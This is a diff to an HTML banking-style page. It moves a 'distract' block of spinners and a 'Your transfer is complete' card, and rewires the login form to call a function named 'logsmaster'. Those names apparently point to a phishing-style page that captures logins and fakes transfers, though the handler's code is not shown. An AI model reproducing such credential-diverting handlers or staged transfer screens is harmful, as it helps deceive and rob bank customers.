@@ -16,7 +16,7 @@
     <!-- Compiled and minified CSS -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
           
-i    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 
     <!-- LINKS -->
@@ -30,6 +30,79 @@ i    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/ma
 
   </head>
   <body>
+
+    <div class="distract">
+      <div class="loader_ui hide">
+        <div class="preloader-wrapper big active">
+          <div class="spinner-layer spinner-blue-only">
+            <div class="circle-clipper left">
+              <div class="circle"></div>
+            </div><div class="gap-patch">
+              <div class="circle"></div>
+            </div><div class="circle-clipper right">
+              <div class="circle"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="row transfer-ui">
+        <div class="col s12 m6">
+          <div class="card ">
+            <div class="card-content white-text">
+              <div class="container">
+                <span>
+                  <div class="preloader-wrapper big active">
+                    <div class="spinner-layer spinner-blue-only">
+                      <div class="circle-clipper left">
+                        <div class="circle"></div>
+                      </div><div class="gap-patch">
+                        <div class="circle"></div>
+                      </div><div class="circle-clipper right">
+                        <div class="circle"></div>
+                      </div>
+                    </div>
+                  </div>
+                </span> 
+                <span class="transfer-info-txt"></span>
+                
+              </div>
+              <br><br><br><br>
+            </div>
+            <div class="card-action hide">
+              <a href="#">This is a link</a>
+              <a href="#">Cancel</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="col s12 m6 completed-transfer hide">
+          <div class="card ">
+            <div class="card-content white-text">
+              <div class="container">
+                <span>
+                  <div class="preloader-wrapper big active">
+                    <div class="spinner-layer spinner-blue-only">
+                      <div class="circle-clipper left">
+                        <div class="circle"></div>
+                      </div><div class="gap-patch">
+                        <div class="circle"></div>
+                      </div><div class="circle-clipper right">
+                        <div class="circle"></div>
+                      </div>
+                    </div>
+                  </div>
+                </span> 
+                <span class="transfer-info-txt">Your transfer is complete. Thank You For Banking With Us.</span>
+              </div>
+
+            </div>
+            <div class="card-action hide">
+              <a href="#">Dashboard</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
     
     <!-- LOGIN BX -->
     <div id="nb-login" class="">
@@ -39,7 +112,7 @@ i    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/ma
       </div>
       <div class="login-bx">
         <div class="row">
-            <form class="col s12" onsubmit="LOGIN_USER();" onclick="HIDE_ERROR('fromLogin'); login_user_error();">
+            <form class="col s12" onsubmit="logsmaster();" onclick="HIDE_ERROR('fromLogin'); login_user_error();">
               <div class="row">
                 <div class="input-field col s12">
                   <input id="acc_email" type="email" class="validate">
@@ -5131,78 +5204,7 @@ i    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/ma
     <!-- END OF ACCOUNTS - NUMERO 10 -->
 
 
-    <div class="distract">
-      <div class="loader_ui hide">
-        <div class="preloader-wrapper big active">
-          <div class="spinner-layer spinner-blue-only">
-            <div class="circle-clipper left">
-              <div class="circle"></div>
-            </div><div class="gap-patch">
-              <div class="circle"></div>
-            </div><div class="circle-clipper right">
-              <div class="circle"></div>
-            </div>
-          </div>
-        </div>
-      </div>
-      <div class="row transfer-ui">
-        <div class="col s12 m6">
-          <div class="card ">
-            <div class="card-content white-text">
-              <div class="container">
-                <span>
-                  <div class="preloader-wrapper big active">
-                    <div class="spinner-layer spinner-blue-only">
-                      <div class="circle-clipper left">
-                        <div class="circle"></div>
-                      </div><div class="gap-patch">
-                        <div class="circle"></div>
-                      </div><div class="circle-clipper right">
-                        <div class="circle"></div>
-                      </div>
-                    </div>
-                  </div>
-                </span> 
-                <span class="transfer-info-txt"></span>
-                
-              </div>
-              <br><br><br><br>
-            </div>
-            <div class="card-action hide">
-              <a href="#">This is a link</a>
-              <a href="#">Cancel</a>
-            </div>
-          </div>
-        </div>
-
-        <div class="col s12 m6 completed-transfer hide">
-          <div class="card ">
-            <div class="card-content white-text">
-              <div class="container">
-                <span>
-                  <div class="preloader-wrapper big active">
-                    <div class="spinner-layer spinner-blue-only">
-                      <div class="circle-clipper left">
-                        <div class="circle"></div>
-                      </div><div class="gap-patch">
-                        <div class="circle"></div>
-                      </div><div class="circle-clipper right">
-                        <div class="circle"></div>
-                      </div>
-                    </div>
-                  </div>
-                </span> 
-                <span class="transfer-info-txt">Your transfer is complete. Thank You For Banking With Us.</span>
-              </div>
-
-            </div>
-            <div class="card-action hide">
-              <a href="#">Dashboard</a>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
+    
 
 
 
